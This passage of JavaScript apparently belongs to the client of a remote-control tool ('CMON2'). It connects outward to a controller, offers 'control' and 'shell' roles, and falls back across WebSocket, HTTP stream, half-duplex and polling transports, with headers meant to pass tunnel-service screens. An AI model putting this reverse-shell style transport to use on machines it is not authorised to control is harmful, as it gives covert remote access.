      header[1] = 0x80 | 127;
      header.writeBigUInt64BE(BigInt(payload.length), 2);
    }
    const mask = crypto.randomBytes(4);
    const masked = wsApplyMask(payload, mask);
    return Buffer.concat([header, mask, masked]);
  }

  async _rawSend(data) {
    await rawWriteAll(this.socket, data, HTTP_SEND_STALL_TIMEOUT * 1000);
  }

  async write(buf) {
    if (this.closed || this.writeClosed) throw new Error('WebSocket tunnel is closed');
    return this.sendMutex.run(async () => {
      if (this.closed || this.writeClosed) throw new Error('WebSocket tunnel is closed');
      try {
        let offset = 0;
        while (offset < buf.length) {
          const piece = buf.subarray(offset, offset + CMON_WS_MAX_FRAME);
          await this._rawSend(this._frame(piece, 0x2));
          offset += piece.length;
        }
      } catch (e) {
        this._broken('write failed: ' + errorText(e));
        throw e;
      }
      return buf.length;
    });
  }

  async _sendControl(opcode, payload = Buffer.alloc(0)) {
    if (this.closed) return;
    try {
      await this.sendMutex.run(async () => {
        if (this.closed) return;
        await this._rawSend(this._frame(payload, opcode));
      });
    } catch (e) {
      this._broken('control frame failed: ' + errorText(e));
    }
  }

  _tick() {
    const t = now();
    if (t >= this.nextPing) {
      this.nextPing = t + CMON_WS_PING;
      this._sendControl(0x9, Buffer.from('cmon', 'ascii'));
    }
    if (t - this.lastRx > CMON_WS_DEAD) {
      this._broken('peer silent for ' + Math.round(t - this.lastRx) + 's');
    }
  }

  async _readFrame() {
    const head = await this.source.readExact(2, { stallFirst: true });
    if (!head) throw new Error('WebSocket tunnel closed');
    const opcode = head[0] & 0x0f;
    const masked = !!(head[1] & 0x80);
    let length = head[1] & 0x7f;
    if (length === 126) {
      const raw = await this.source.readExact(2, { stallFirst: true });
      if (!raw) throw new Error('WebSocket tunnel closed');
      length = raw.readUInt16BE(0);
    } else if (length === 127) {
      const raw = await this.source.readExact(8, { stallFirst: true });
      if (!raw) throw new Error('WebSocket tunnel closed');
      const big = raw.readBigUInt64BE(0);
      if (big > BigInt(MAX_MSG)) throw new Error('WebSocket peer sent an oversized frame');
      length = Number(big);
    }
    if (length > MAX_MSG) throw new Error('WebSocket peer sent an oversized frame');
    let mask = null;
    if (masked) {
      mask = await this.source.readExact(4, { stallFirst: true });
      if (!mask) throw new Error('WebSocket tunnel closed');
    }
    let payload = Buffer.alloc(0);
    if (length) {
      payload = await this.source.readExact(length, { stallFirst: true });
      if (!payload) throw new Error('WebSocket tunnel closed');
      if (mask) payload = wsApplyMask(payload, mask);
    }
    this.lastRx = now();
    return { opcode, payload };
  }

  async _pump() {
    // Keep exactly one frame read outstanding.  Racing a fresh _readFrame()
    // against the heartbeat timer on every pass left the previous read
    // running, so two readers consumed the same socket and split frame bytes
    // between them (garbage lengths, disconnects on large uploads).
    let pending = null;
    const TIMEOUT = Symbol('timeout');
    try {
      while (!this.closed) {
        if (!pending) {
          pending = this._readFrame();
          pending.catch(() => { /* observed by the race or in finally */ });
        }
        let frame;
        try {
          frame = await Promise.race([
            pending,
            sleep(600).then(() => TIMEOUT),
          ]);
        } catch (e) {
          // A real read error means the frame stream can no longer be
          // trusted; reconnecting is the only safe recovery.
          pending = null;
          throw e;
        }
        if (frame === TIMEOUT) {
          if (this.source.closed) throw new Error('WebSocket tunnel closed');
          this._tick();
          continue;
        }
        pending = null;
        const { opcode, payload } = frame;
        if (opcode === 0x8) {
          this._sendControl(0x8, payload.subarray(0, 125));
          break;
        }
        if (opcode === 0x9) {
          this._sendControl(0xa, payload.subarray(0, 125));
          continue;
        }
        if (opcode === 0xa) continue;
        if ((opcode === 0x0 || opcode === 0x1 || opcode === 0x2) && payload.length) {
          if (!(await this.queue.waitForRoom())) throw new Error('WebSocket tunnel closed');
          this.queue.push(payload);
        }
      }
    } catch (e) {
      log('[ws-tunnel] pump ended:', errorText(e));
    } finally {
      if (pending) pending.catch(() => { /* socket is closing */ });
      this._broken('pump finished');
    }
  }

  shutdownWrite() {
    if (this.closed || this.writeClosed) return;
    this.writeClosed = true;
    this._sendControl(0x8, Buffer.alloc(0)).catch(() => {});
  }

  _broken(reason = null) {
    if (!this.closed) {
      this.closed = true;
      if (reason) log('[ws-tunnel] closing:', reason);
      this.queue.close();
      try { this.source.close(); } catch { /* ignore */ }
      try { this.socket.destroy(); } catch { /* ignore */ }
    }
  }

  close() {
    this._broken('closed by the client');
  }
}

function wsApplyMask(data, mask) {
  if (!data || !data.length) return data || Buffer.alloc(0);
  if (!mask || mask.length !== 4) throw new Error('invalid WebSocket mask');
  const out = Buffer.allocUnsafe(data.length);
  for (let i = 0; i < data.length; i++) out[i] = data[i] ^ mask[i & 3];
  return out;
}

function wsAcceptValue(key) {
  return crypto.createHash('sha1')
    .update(key + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11', 'ascii')
    .digest('base64');
}

// ---------------------------------------------------------------------------
// Transport openers
// ---------------------------------------------------------------------------
async function wsConnect(host, port, path = '/tunnel', useTls = true, token = null) {
  const raw = await connectTarget(host, port);
  let sock = raw;
  try {
    tuneSocket(raw);
    if (useTls) {
      raw.setTimeout(HTTP_HANDSHAKE_TIMEOUT * 1000);
      sock = await wrapClientTls(raw, host, false);
    }
    const source = socketSourceQueue(sock);
    const key = crypto.randomBytes(16).toString('base64');
    const query = token ? '?token=' + encodeURIComponent(token) : '';
    const lines = [
      'GET ' + path + query + ' HTTP/1.1',
      'Host: ' + hostHeader(host, port),
      'Upgrade: websocket',
      'Connection: Upgrade',
      'Sec-WebSocket-Key: ' + key,
      'Sec-WebSocket-Version: 13',
      'Sec-WebSocket-Protocol: ' + CMON_WS_PROTOCOL,
      ...tunnelHeaders(host, token),
      '', '',
    ];
    sock.setTimeout(HTTP_HANDSHAKE_TIMEOUT * 1000);
    await rawWriteAll(sock, Buffer.from(lines.join('\r\n'), 'latin1'), HTTP_HANDSHAKE_TIMEOUT * 1000);
    const headLines = await readHttpHead(source, HTTP_HANDSHAKE_TIMEOUT * 1000);
    const status = httpStatus(headLines);
    if (status.code !== 101) {
      throw new TransportNotSupported('WebSocket upgrade returned HTTP ' + status.code + ' ' + status.text);
    }
    const headers = httpHeaders(headLines.slice(1));
    if ((headers.get('sec-websocket-accept') || '') !== wsAcceptValue(key)) {
      throw new TransportNotSupported('incorrect Sec-WebSocket-Accept');
    }
    const selected = headers.get('sec-websocket-protocol') || '';
    if (selected && selected !== CMON_WS_PROTOCOL) {
      throw new TransportNotSupported('WebSocket subprotocol ' + JSON.stringify(selected) + ' is not supported');
    }
    sock.setTimeout(0);
    return new WsTunnelConn(sock, source, 'ws-' + path.replace(/^\/+/, ''));
  } catch (e) {
    try { sock.destroy(); } catch { /* ignore */ }
    try { raw.destroy(); } catch { /* ignore */ }
    throw e;
  }
}

async function httpStreamConnect(host, port, path = '/tunnel', useTls = true, token = null) {
  const raw = await connectTarget(host, port);
  let sock = raw;
  try {
    tuneSocket(raw);
    if (useTls) {
      raw.setTimeout(HTTP_HANDSHAKE_TIMEOUT * 1000);
      sock = await wrapClientTls(raw, host, false);
    }
    const source = socketSourceQueue(sock);
    const request = [
      'POST ' + path + ' HTTP/1.1',
      'Host: ' + hostHeader(host, port),
      'Content-Type: application/octet-stream',
      'Transfer-Encoding: chunked',
      'Connection: keep-alive',
      ...tunnelHeaders(host, token),
      '', '',
    ];
    sock.setTimeout(HTTP_HANDSHAKE_TIMEOUT * 1000);
    await rawWriteAll(sock, Buffer.from(request.join('\r\n'), 'latin1'), HTTP_HANDSHAKE_TIMEOUT * 1000);
    const headLines = await readHttpHead(source, HTTP_HANDSHAKE_TIMEOUT * 1000);
    const status = httpStatus(headLines);
    if (status.code !== 200) {
      throw new TransportNotSupported('controller returned HTTP ' + status.code + ' ' + status.text);
    }
    const headers = httpHeaders(headLines.slice(1));
    const transferTokens = (headers.get('transfer-encoding') || '').toLowerCase()
      .split(',').map((item) => item.trim()).filter(Boolean);
    if (!transferTokens.length || transferTokens[transferTokens.length - 1] !== 'chunked'
      || transferTokens.slice(0, -1).some((item) => item !== 'identity' && item !== 'chunked')) {
      throw new TransportNotSupported('controller response is not chunked');
    }
    const encoding = (headers.get('content-encoding') || '').trim().toLowerCase();
    if (encoding && encoding !== 'identity') {
      throw new TransportNotSupported('controller/proxy compressed the tunnel (' + encoding + ')');
    }
    sock.setTimeout(0);
    return new HttpTunnelConn(sock, source, 'http-' + path.replace(/^\/+/, ''));
  } catch (e) {
    try { sock.destroy(); } catch { /* ignore */ }
    try { raw.destroy(); } catch { /* ignore */ }
    throw e;
  }
}

// ---------------------------------------------------------------------------
// HTTP long-poll fallback and half-duplex upload support
// ---------------------------------------------------------------------------
function httpVersionForRequests() {
  return isOn(process.env.CMON_FORCE_HTTP10) ? 'HTTP/1.0' : 'HTTP/1.1';
}

async function pollRequest(host, port, useTls, method, path, body = Buffer.alloc(0), timeoutMs = POLL_TIMEOUT * 1000) {
  const raw = await connectTarget(host, port);
  let sock = raw;
  try {
    tuneSocket(raw);
    if (useTls) {
      raw.setTimeout(HTTP_HANDSHAKE_TIMEOUT * 1000);
      sock = await wrapClientTls(raw, host, false);
    }
    const source = socketSourceQueue(sock);
    const lines = [
      method + ' ' + path + ' ' + httpVersionForRequests(),
      'Host: ' + hostHeader(host, port),
      'Accept: */*',
      'Content-Type: application/octet-stream',
      'Content-Length: ' + body.length,
      'Connection: close',
      'Cache-Control: no-store',
      'User-Agent: ' + CMON_USER_AGENT,
      'ngrok-skip-browser-warning: 1',
      'X-Pinggy-No-Screen: 1',
      'X-CMon: 1',
      '', '',
    ];
    sock.setTimeout(timeoutMs);
    await rawWriteAll(sock, Buffer.concat([Buffer.from(lines.join('\r\n'), 'latin1'), body]), timeoutMs);
    const headLines = await readHttpHead(source, timeoutMs);
    const status = httpStatus(headLines);
    const headers = httpHeaders(headLines.slice(1));
    const lengthText = headers.get('content-length');
    let data;
    if (lengthText !== undefined) {
      const length = parseInt(lengthText, 10);
      if (!Number.isFinite(length) || length < 0 || length > MAX_MSG) {
        throw new TransportNotSupported('bad poll Content-Length');
      }
      data = await source.readExact(length, { stallFirst: true, deadline: now() + timeoutMs / 1000 + 5 });
      if (!data) throw new TransportNotSupported('poll response ended early');
    } else {
      data = await source.readToEof({ cap: POLL_BATCH * 4, deadline: now() + timeoutMs / 1000 + 5 });
    }
    return { code: status.code, headers, body: data };
  } finally {
    try { sock.destroy(); } catch { /* ignore */ }
    try { raw.destroy(); } catch { /* ignore */ }
  }
}

class AsyncUpQueue {
  constructor(capacity = 128) {
    this.items = [];
    this.capacity = capacity;
    this.waiters = [];
    this.spaceWaiters = [];
  }

  get length() { return this.items.length; }

  async put(item, timeoutMs = 0) {
    const deadline = timeoutMs > 0 ? Date.now() + timeoutMs : null;
    while (this.items.length >= this.capacity) {
      const wait = deadline == null ? 0 : deadline - Date.now();
      if (deadline != null && wait <= 0) throw new Error('send queue is full');
      await new Promise((resolve) => {
        this.spaceWaiters.push(resolve);
        if (wait > 0) {
          const timer = setTimeout(resolve, wait);
          if (timer.unref) timer.unref();
        }
      });
    }
    this.items.push(item);
    const waiters = this.waiters;
    this.waiters = [];
    for (const wake of waiters) wake();
  }

  tryGet() {
    if (!this.items.length) return undefined;
    const item = this.items.shift();
    this._wakeSpace();
    return item;
  }

  async get(timeoutMs) {
    if (this.items.length) return this.tryGet();
    let timedOut = false;
    await new Promise((resolve) => {
      const done = () => { clearTimeout(timer); resolve(); };
      this.waiters.push(done);
      const timer = setTimeout(() => { timedOut = true; done(); }, timeoutMs);
      if (timer.unref) timer.unref();
    });
    if (this.items.length) return this.tryGet();
    return timedOut ? undefined : undefined;
  }

  _wakeSpace() {
    const waiters = this.spaceWaiters;
    this.spaceWaiters = [];
    for (const wake of waiters) wake();
  }

  clear() {
    this.items = [];
    this._wakeSpace();
  }
}

// Minimal HTTP response-body reader (chunked or close-delimited), matching the
// client.py _BodyStream: after the headers, /down delivers application bytes
// through HTTP chunk framing, so the half-duplex frame parser must read the
// *decoded* body.
class HttpBodyReader {
  constructor(source, chunked) {
    this.source = source;
    this.chunked = chunked;
    this.eof = false;
    this.chunks = [];
    this.length = 0;
  }

  _push(buf) {
    if (!buf || !buf.length) return;
    this.chunks.push(buf);
    this.length += buf.length;
  }

  take(n) {
    const size = Math.min(n, this.length);
    if (this.chunks[0].length >= size) {
      const out = this.chunks[0].subarray(0, size);
      if (this.chunks[0].length === size) this.chunks.shift();
      else this.chunks[0] = this.chunks[0].subarray(size);
      this.length -= size;
      return out;
    }
    const out = Buffer.allocUnsafe(size);
    let off = 0;
    while (off < size) {
      const c = this.chunks[0];
      const take = Math.min(c.length, size - off);
      c.copy(out, off, 0, take);
      off += take;
      if (take === c.length) this.chunks.shift();
      else this.chunks[0] = c.subarray(take);
    }
    this.length -= size;
    return out;
  }

  async _more() {
    if (this.eof) return false;
    if (!this.chunked) {
      const piece = await this.source.readSome(RECV_CHUNK, {});
      if (piece === null) {
        this.eof = true;
        return false;
      }
      this._push(piece);
      return true;
    }
    let line = await this.source.readUntil(CRLF, HTTP_MAX_LINE);
    if (line === null) {
      this.eof = true;
      return false;
    }
    while (line.length <= 2) {
      line = await this.source.readUntil(CRLF, HTTP_MAX_LINE);
      if (line === null) {
        this.eof = true;
        return false;
      }
    }
    const text = line.subarray(0, line.length - 2).toString('latin1');
    const size = parseInt(text.split(';')[0].trim(), 16);
    if (!Number.isFinite(size) || size < 0) throw new Error('invalid HTTP chunk size');
    if (size > HTTP_MAX_CHUNK) throw new Error('HTTP chunk is too large');
    if (size === 0) {
      for (;;) {
        const trailer = await this.source.readUntil(CRLF, HTTP_MAX_LINE);
        if (trailer === null) break;
        if (trailer.length <= 2) break;
      }
      this.eof = true;
      return false;
    }
    const data = await this.source.readExact(size + 2, { stallFirst: true });
    if (!data || data[data.length - 2] !== 0x0d || data[data.length - 1] !== 0x0a) {
      throw new Error('missing HTTP chunk terminator');
    }
    this._push(data.subarray(0, size));
    return true;
  }

  async readExact(n) {
    while (this.length < n && !this.eof) await this._more();
    if (this.length < n) return null;
    return this.take(n);
  }

  close() {
    this.eof = true;
  }
}

class HalfTunnelConn {
  constructor(downSocket, downSource, sessionId, host, port, useTls, role, token) {
    this.downSocket = downSocket;
    this.downSource = downSource;
    this.sessionId = sessionId;
    this.host = host;
    this.port = port;
    this.useTls = useTls;
    this.role = role;
    this.token = token;
    this.queue = new ByteQueue(RECV_QUEUE_MAX);
    this.closed = false;
    this.kind = 'http-half';
    this.writeClosed = false;
    this.upQ = new AsyncUpQueue(128);
    this.upSock = null;
    this.upSeq = 0;
    this._downLoop();
    this._upLoop();
  }

  async write(buf) {
    if (this.closed || this.writeClosed) throw new Error('half-duplex tunnel is closed');
    await this.upQ.put(Buffer.from(buf), 30000);
    return buf.length;
  }

  async _downLoop() {
    try {
      for (;;) {
        if (this.closed) break;
        const kind = await this.downSource.readExact(1, { stallFirst: true });
        if (!kind) throw new Error('half-duplex downlink closed');
        if (kind[0] === 0x00) continue;
        if (kind[0] === 0x02) break;
        if (kind[0] !== 0x01) throw new Error('bad half-duplex frame');
        const lenBuf = await this.downSource.readExact(4, { stallFirst: true });
        if (!lenBuf) throw new Error('half-duplex downlink closed');
        const length = lenBuf.readUInt32BE(0);
        if (length > MAX_MSG) throw new Error('half-duplex frame is too large');
        const payload = length ? await this.downSource.readExact(length, { stallFirst: true }) : Buffer.alloc(0);
        if (payload === null) throw new Error('half-duplex downlink closed');
        if (!(await this.queue.waitForRoom())) throw new Error('half-duplex tunnel closed');
        this.queue.push(payload);
      }
    } catch (e) {
      if (!this.closed) log('[half-tunnel] downlink ended:', errorText(e));
    } finally {
      this._broken();
    }
  }

  _closeUpSocket() {
    const sock = this.upSock;
    this.upSock = null;
    if (sock) {
      try { sock.destroy(); } catch { /* ignore */ }
    }
  }

  async _openUpSocket() {
    const raw = await connectTarget(this.host, this.port);
    let sock = raw;
    try {
      tuneSocket(raw);
      if (this.useTls) {
        raw.setTimeout(HTTP_HANDSHAKE_TIMEOUT * 1000);
        sock = await wrapClientTls(raw, this.host, false);
      }
      return sock;
    } catch (e) {
      try { sock.destroy(); } catch { /* ignore */ }
      try { raw.destroy(); } catch { /* ignore */ }
      throw e;
    }
  }

  async _sendUpOnce(data, sequence) {
    if (!this.upSock) this.upSock = await this._openUpSocket();
    const sock = this.upSock;
    const lines = [
      'POST /up ' + httpVersionForRequests(),
      'Host: ' + hostHeader(this.host, this.port),
      'Content-Type: application/octet-stream',
      'Content-Length: ' + data.length,
      'Connection: keep-alive',
      'X-CMon-Session: ' + this.sessionId,
      'X-CMon-Up-Seq: ' + sequence,
      ...tunnelHeaders(this.host, this.token, this.role),
      '', '',
    ];
    const source = socketSourceQueue(sock);
    sock.setTimeout(HALF_UP_TIMEOUT * 1000);
    await rawWriteAll(sock, Buffer.concat([Buffer.from(lines.join('\r\n'), 'latin1'), data]), HALF_UP_TIMEOUT * 1000);
    const headLines = await readHttpHead(source, HALF_UP_TIMEOUT * 1000);
    const status = httpStatus(headLines);
    const headers = httpHeaders(headLines.slice(1));
    let length = 0;
    try { length = parseInt(headers.get('content-length') || '0', 10) || 0; } catch { length = 0; }
    if (length > 0) {
      const body = await source.readExact(length, { stallFirst: true, deadline: now() + 30 });
      if (body === null) throw new Error('POST /up response body ended early');
    }
    const tokens = (headers.get('connection') || '').toLowerCase()
      .split(',').map((item) => item.trim()).filter(Boolean);
    if (tokens.includes('close')
      || (status.version === 'HTTP/1.0' && !tokens.includes('keep-alive'))) {
      this._closeUpSocket();
    }
    if (status.code !== 200) throw new Error('POST /up returned HTTP ' + status.code);
  }

  async _sendUp(data) {
    this.upSeq += 1;
    const sequence = this.upSeq;
    try {
      await this._sendUpOnce(data, sequence);
    } catch (e) {
      this._closeUpSocket();
      if (this.closed) throw e;
      await this._sendUpOnce(data, sequence);
    }
  }

  async _upLoop() {
    try {
      while (!this.closed) {
        const first = await this.upQ.get(500);
        if (first === undefined) continue;
        if (first === null) break;
        let batch = Buffer.from(first);
        while (batch.length < HALF_UP_BATCH) {
          let more;
          if (batch.length < 64 * 1024) {
            more = this.upQ.tryGet();
            if (more === undefined) {
              await sleep(5);
              more = this.upQ.tryGet();
              if (more === undefined) break;
            }
          } else {
            more = this.upQ.tryGet();
            if (more === undefined) break;
          }
          if (more === null) break;
          batch = Buffer.concat([batch, more]);
        }
        if (batch.length) await this._sendUp(batch);
      }
    } catch (e) {
      if (!this.closed) {
        log('[!] half-duplex upload stopped:', errorText(e));
        this._broken();
      }
    }
  }

  shutdownWrite() {
    if (this.writeClosed) return;
    this.writeClosed = true;
    this.upQ.put(null, 1000).catch(() => {});
  }

  _broken() {
    if (!this.closed) {
      this.closed = true;
      this.queue.close();
      try { this.downSource.close(); } catch { /* ignore */ }
      try { this.downSocket.destroy(); } catch { /* ignore */ }
      this._closeUpSocket();
    }
  }

  close() {
    if (this.closed) return;
    this._broken();
    this.upQ.put(null, 1000).catch(() => {});
  }
}

class PollTunnelConn {
  constructor(host, port, useTls, sid, role, token, initial) {
    this.host = host;
    this.port = port;
    this.useTls = useTls;
    this.sessionId = sid;
    this.role = role;
    this.token = token;
    this.queue = new ByteQueue(RECV_QUEUE_MAX);
    this.closed = false;
    this.kind = 'http-poll';
    this.writeClosed = false;
    this.downPos = 0;
    this.upSeq = 0;
    this.upQ = new AsyncUpQueue(128);
    this._closeNotified = false;
    if (initial && initial.length) {
      this.queue.push(initial);
      this.downPos += initial.length;
    }
    this._downLoop();
    this._upLoop();
  }

  async write(buf) {
    if (this.closed || this.writeClosed) throw new Error('poll tunnel is closed');
    await this.upQ.put(Buffer.from(buf), 30000);
    return buf.length;
  }

  _path(endpoint, extra) {
    let query = 'session=' + encodeURIComponent(this.sessionId);
    if (extra) query += '&' + extra;
    return '/poll/' + endpoint + '?' + query;
  }

  async _downLoop() {
    try {
      for (;;) {
        if (this.closed) break;
        let extra = 'ack=' + this.downPos + '&wait=' + Math.trunc(POLL_WAIT)
          + '&role=' + encodeURIComponent(this.role);
        if (this.token) extra += '&token=' + encodeURIComponent(this.token);
        const { code, headers, body } = await pollRequest(
          this.host, this.port, this.useTls, 'GET', this._path('down', extra),
          Buffer.alloc(0), (POLL_WAIT + 17) * 1000);
        if (code !== 200) {
          if (code === 404 || code === 409 || code === 410) break;
          throw new Error('poll down returned HTTP ' + code);
        }
        if (body && body.length) {
          if (!(await this.queue.waitForRoom())) break;
          this.queue.push(body);
          this.downPos += body.length;
        }
        if (headers.get('x-cmon-poll-close')) break;
      }
    } catch (e) {
      if (!this.closed) log('[poll-tunnel] downlink ended:', errorText(e));
    } finally {
      this._broken();
    }
  }

  async _upLoop() {
    try {
      while (!this.closed) {
        const first = await this.upQ.get(500);
        if (first === undefined) continue;
        if (first === null) break;
        let batch = Buffer.from(first);
        while (batch.length < POLL_BATCH) {
          let more;
          if (batch.length < 64 * 1024) {
            more = this.upQ.tryGet();
            if (more === undefined) {
              await sleep(5);
              more = this.upQ.tryGet();
              if (more === undefined) break;
            }
          } else {
            more = this.upQ.tryGet();
            if (more === undefined) break;
          }
          if (more === null) break;
          batch = Buffer.concat([batch, more]);
        }
        if (!batch.length) continue;
        this.upSeq += 1;
        const sequence = this.upSeq;
        let path = this._path('up', 'seq=' + sequence + '&role=' + encodeURIComponent(this.role));
        if (this.token) path += '&token=' + encodeURIComponent(this.token);
        let lastError = null;
        for (let attempt = 0; attempt < 3; attempt++) {
          try {
            const { code } = await pollRequest(this.host, this.port, this.useTls, 'POST', path, batch, POLL_TIMEOUT * 1000);
            if (code === 200) { lastError = null; break; }
            lastError = new Error('HTTP ' + code);
            if (code === 403 || code === 404 || code === 409 || code === 410) throw lastError;
          } catch (e) {
            lastError = e;
          }
          if (this.closed) break;
          await sleep(200 * (attempt + 1));
        }
        if (lastError) {
          log('[!] poll upload stopped:', errorText(lastError));
          break;
        }
      }
    } catch (e) {
      if (!this.closed) log('[!] poll upload stopped:', errorText(e));
    }
  }

  async _notifyClose() {
    let extra = 'close=1&role=' + encodeURIComponent(this.role);
    if (this.token) extra += '&token=' + encodeURIComponent(this.token);
    try {
      await pollRequest(this.host, this.port, this.useTls, 'POST', this._path('up', extra), Buffer.alloc(0), 2000);
    } catch { /* ignore */ }
  }

  shutdownWrite() {
    if (this.writeClosed) return;
    this.writeClosed = true;
    this.upQ.put(null, 1000).catch(() => {});
  }

  _broken() {
    if (!this.closed) {
      this.closed = true;
      this.queue.close();
    }
  }

  close() {
    if (this.closed) return;
    if (!this._closeNotified) {
      this._closeNotified = true;
      this._notifyClose();
    }
    this._broken();
    this.upQ.put(null, 1000).catch(() => {});
  }
}

async function halfConnect(host, port, useTls = true, role = 'control', token = null) {
  const sid = (role === 'shell' && token) ? token : crypto.randomBytes(18).toString('base64url');
  const raw = await connectTarget(host, port);
  let sock = raw;
  try {
    tuneSocket(raw);
    if (useTls) {
      raw.setTimeout(HTTP_HANDSHAKE_TIMEOUT * 1000);
      sock = await wrapClientTls(raw, host, false);
    }
    const source = socketSourceQueue(sock);
    const lines = [
      'GET /down?session=' + encodeURIComponent(sid) + ' ' + httpVersionForRequests(),
      'Host: ' + hostHeader(host, port),
      'Connection: keep-alive',
      'X-CMon-Session: ' + sid,
      ...tunnelHeaders(host, token, role),
      '', '',
    ];
    sock.setTimeout(HTTP_HANDSHAKE_TIMEOUT * 1000);
    await rawWriteAll(sock, Buffer.from(lines.join('\r\n'), 'latin1'), HTTP_HANDSHAKE_TIMEOUT * 1000);
    const headLines = await readHttpHead(source, HTTP_HANDSHAKE_TIMEOUT * 1000);
    const status = httpStatus(headLines);
    if (status.code !== 200) throw new TransportNotSupported('GET /down returned HTTP ' + status.code);
    const headers = httpHeaders(headLines.slice(1));
    const transferTokens = (headers.get('transfer-encoding') || '')
      .toLowerCase().split(',').map((item) => item.trim()).filter(Boolean);
    const chunked = transferTokens.length > 0 && transferTokens[transferTokens.length - 1] === 'chunked';
    sock.setTimeout(0);
    const body = new HttpBodyReader(source, chunked);
    return new HalfTunnelConn(sock, body, sid, host, port, useTls, role, token);
  } catch (e) {
    try { sock.destroy(); } catch { /* ignore */ }
    try { raw.destroy(); } catch { /* ignore */ }
    throw e;
  }
}

async function pollConnect(host, port, useTls = true, role = 'control', token = null) {
  const sid = (role === 'shell' && token) ? token : crypto.randomBytes(18).toString('base64url');
  let path = '/poll/down?session=' + encodeURIComponent(sid) + '&ack=0&wait=0&role=' + encodeURIComponent(role);
  if (token) path += '&token=' + encodeURIComponent(token);
  const { code, body } = await pollRequest(host, port, useTls, 'GET', path, Buffer.alloc(0), (HTTP_HANDSHAKE_TIMEOUT + 5) * 1000);
  if (code !== 200) throw new TransportNotSupported('poll session returned HTTP ' + code);
  return new PollTunnelConn(host, port, useTls, sid, role, token, body);
}

// ---------------------------------------------------------------------------
// Handshake, transport selection and caching
// ---------------------------------------------------------------------------
const TRANSPORT_CACHE = { key: null, kind: null };

function cacheKey(host, port, scheme) {
  return String(host).toLowerCase() + ':' + port + ':' + String(scheme).toLowerCase();
}

function rememberTransport(key, kind) {
  TRANSPORT_CACHE.key = key;
  TRANSPORT_CACHE.kind = kind;
}

function cachedTransport(key) {
  return TRANSPORT_CACHE.key === key ? TRANSPORT_CACHE.kind : null;
}

function transportCandidates(host, port, scheme) {
  scheme = String(scheme || 'auto').toLowerCase();
  if (scheme === 'tcp') return ['tcp'];
  if (scheme === 'tls') return ['tls'];
  if (scheme === 'https') return ['https'];
  if (scheme === 'http') return ['http'];
  const preferred = ['tcp', 'http', 'https'].includes(CONNECTION_TYPE) ? CONNECTION_TYPE : null;
  let order;
  if (looksLikeTunnelHost(host) || port === 443) order = ['https', 'http'];
  else if (port === 80) order = ['http', 'https'];
  else order = ['tcp', 'tls', 'http', 'https'];
  if (preferred) order = [preferred, ...order.filter((item) => item !== preferred)];
  return order;
}

async function recvHelloAck(conn, timeout = TUNNEL_PROBE_TIMEOUT) {
  try {
    await sendMsg(conn, { type: 'hello', env: environmentReport() });
    const msg = await recvMsg(conn, now() + timeout);
    if (!msg || msg.type !== 'hello_ack') {
      throw new TransportNotSupported('controller did not acknowledge the tunnel handshake');
    }
    return msg;
  } catch (e) {
    if (e instanceof TransportNotSupported) throw e;
    throw new TransportNotSupported('tunnel handshake failed: ' + errorText(e));
  }
}

async function rawHandshake(conn, role, token = null) {
  let line;
  if (role === 'shell') {
    if (!token) throw new TransportNotSupported('shell token is missing');
    line = Buffer.from('CMON2 SHELL ' + token + '\n', 'ascii');
  } else {
    line = CMON_MAGIC;
  }
  await conn.write(line);
  const ack = await conn.queue.readUntil(Buffer.from('\n', 'ascii'), 512, { deadline: now() + HTTP_HANDSHAKE_TIMEOUT });
  if (!ack) throw new TransportNotSupported('controller closed during CMON2 handshake');
  const text = ack.toString('latin1');
  if (!text.startsWith(CMON_ACK.toString('ascii').trim())) {
    throw new TransportNotSupported('unexpected CMON2 acknowledgement: ' + JSON.stringify(text));
  }
  return conn;
}

async function rawConnect(host, port, useTls, role, token) {
  const header = await connectTarget(host, port);
  let sock = header;
  try {
    tuneSocket(header);
    if (useTls) {
      header.setTimeout(HTTP_HANDSHAKE_TIMEOUT * 1000);
      sock = await wrapClientTls(header, host, false);
    }
    const conn = new SocketConn(sock, useTls ? 'tls' : 'tcp');
    return await rawHandshake(conn, role, token);
  } catch (e) {
    try { sock.destroy(); } catch { /* ignore */ }
    try { header.destroy(); } catch { /* ignore */ }
    throw e;
  }
}

async function openControllerConnection(host, port, scheme = 'auto', role = 'control', token = null) {
  const key = cacheKey(host, port, scheme);
  let candidates = transportCandidates(host, port, scheme);
  const cached = cachedTransport(key);
  if (cached && candidates.includes(cached)) {
    candidates = [cached, ...candidates.filter((item) => item !== cached)];
  }
  const errors = [];
  for (const family of candidates) {
    let variants;
    if (family === 'http' || family === 'https') {
      const useTls = family === 'https';
      const path = role === 'shell' ? '/shell' : '/tunnel';
      variants = [];
      if (!isOn(process.env.CMON_DISABLE_WS)) {
        variants.push(['websocket', () => wsConnect(host, port, path, useTls, token)]);
      }
      if (!isOn(process.env.CMON_DISABLE_STREAM)) {
        variants.push(['http-stream', () => httpStreamConnect(host, port, path, useTls, token)]);
      }
      if (!isOn(process.env.CMON_DISABLE_HALF)) {
        variants.push(['http-half', () => halfConnect(host, port, useTls, role, token)]);
      }
      if (!isOn(process.env.CMON_DISABLE_POLL)) {
        variants.push(['http-poll', () => pollConnect(host, port, useTls, role, token)]);
      }
      const cachedVariant = cachedTransport(key);
      if (cachedVariant) {
        variants.sort((a, b) => (a[0] === cachedVariant ? 0 : 1) - (b[0] === cachedVariant ? 0 : 1));
      }
    } else if (family === 'tls') {
      variants = [['tls', () => rawConnect(host, port, true, role, token)]];
    } else {
      variants = [['tcp', () => rawConnect(host, port, false, role, token)]];
    }
    for (const [variant, factory] of variants) {
      let conn = null;
      try {
        conn = await factory();
        if (role === 'control') await recvHelloAck(conn);
        rememberTransport(key, variant);
        return { conn, family, variant };
      } catch (e) {
        errors.push(variant + ': ' + errorText(e));
        if (conn) {
          try { conn.close(); } catch { /* ignore */ }
        }
        continue;
      }
    }
  }
  throw new TransportNotSupported(errors.length ? errors.join('; ') : 'no transport succeeded');
}

// ---------------------------------------------------------------------------
// Working directory handling (mirrors change_dir)
// ---------------------------------------------------------------------------
let PREV_DIR = null;

function shlexSplit(text) {
  const tokens = [];
  let current = '';
  let started = false;
  let quote = null;
  let i = 0;
  while (i < text.length) {
    const c = text[i];
    if (quote) {
      if (c === quote) {
        quote = null;
      } else if (c === '\\' && quote === '"' && i + 1 < text.length
        && ['"', '\\', '$', '`'].includes(text[i + 1])) {
        i += 1;
        current += text[i];
      } else {
        current += c;
      }
    } else if (c === "'" || c === '"') {
      quote = c;
      started = true;
    } else if (c === '\\') {
      if (i + 1 < text.length) {
        i += 1;
        current += text[i];
      } else {
        throw new Error('No escaped character');
      }
